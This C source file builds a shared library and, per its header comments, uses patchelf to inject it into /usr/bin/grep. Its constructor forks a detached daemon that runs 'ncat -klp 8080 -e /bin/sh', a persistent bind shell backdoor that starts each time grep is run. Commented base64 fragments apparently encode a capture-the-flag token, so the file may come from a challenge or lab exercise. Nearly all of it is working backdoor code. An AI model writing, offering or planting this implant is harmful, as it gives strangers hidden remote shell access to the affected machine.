// ncso.c
// gcc -shared -fPIC -o libncso.so ncso.c
// patchelf --add-needed /libncso.so /usr/bin/grep

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>
#include <string.h>
#include <errno.h>

// const char b1[] = "UA==";
// const char b2[] = "Qw==";
// const char b3[] = "Qw==";
// const char b4[] = "Qw==";
// const char b5[] = "ew==";
// const char b6[] = "dA==";
// const char b7[] = "bw==";
// const char b8[] = "aw==";
// const char b9[] = "ZQ==";
// const char b10[] = "bg==";
// const char b11[] = "Xw==";
// const char b12[] = "OQ==";
// const char b13[] = "Xw==";
// const char b14[] = "Zw==";
// const char b15[] = "cg==";
// const char b16[] = "ZQ==";
// const char b17[] = "cA==";
// const char b18[] = "Xw==";
// const char b19[] = "bA==";
// const char b20[] = "aQ==";
// const char b21[] = "Yg==";
// const char b22[] = "fQ==";

PLACEHOLDER


// Return 1 if we already have a ncat 8080 style process, else 0
static int ncat_daemon_running(void) {
    DIR *d = opendir("/proc");
    if (!d) {
        // If /proc isn't accessible, just assume not running
        return 0;
    }

    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        // Only consider numeric entries
        char *endptr;
        long pid = strtol(de->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        if (pid <= 0) continue;

        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path),
                 "/proc/%ld/cmdline", pid);

        int fd = open(cmdline_path, O_RDONLY);
        if (fd < 0) continue;

        char buf[512];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0) continue;

        // cmdline is NUL-separated: arg0\0arg1\0...last\0
        // Convert internal NULs to spaces so strstr can see all args.
        for (ssize_t i = 0; i < n; i++) {
            if (buf[i] == '\0') buf[i] = ' ';
        }
        buf[n] = '\0';

        // Heuristic match for our daemon:
        if (strstr(buf, "ncat") && strstr(buf, "8080")) {
            closedir(d);
            return 1;
        }
    }

    closedir(d);
    return 0;
}

__attribute__((constructor))
static void ncat_ctor(void) {
    // Global guard: if a matching daemon is already running, do nothing
    if (ncat_daemon_running()) {
        return;
    }

    // First fork: parent is grep, child continues
    pid_t pid1 = fork();
    if (pid1 < 0) {
        // fork failed; just let grep run normally
        return;
    }
    if (pid1 > 0) {
        // Parent (grep) — return immediately, do not block
        return;
    }

    // First child process

    // Detach from controlling terminal and create a new session
    if (setsid() < 0) {
        // Not fatal; keep going
    }

    // Second fork: ensure we are not a session leader and will be adopted by PID 1
    pid_t pid2 = fork();
    if (pid2 < 0) {
        _exit(1);
    }
    if (pid2 > 0) {
        // First child exits; grandchild will be re-parented to PID 1
        _exit(0);
    }

    // Grandchild: this will become the long-lived ncat process

    // Optional: ignore SIGPIPE
    signal(SIGPIPE, SIG_IGN);

    // Detach stdio from grep's TTY
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > STDERR_FILENO) close(devnull);
    }

    // Exec a real binary that stays open: ncat
    execl("/usr/bin/ncat",
        "ncat",
        "-klp",
        "8080",
        "-e",
        "/bin/sh",
        (char *)NULL);

    // If we get here, exec failed; just exit quietly
    _exit(127);
}
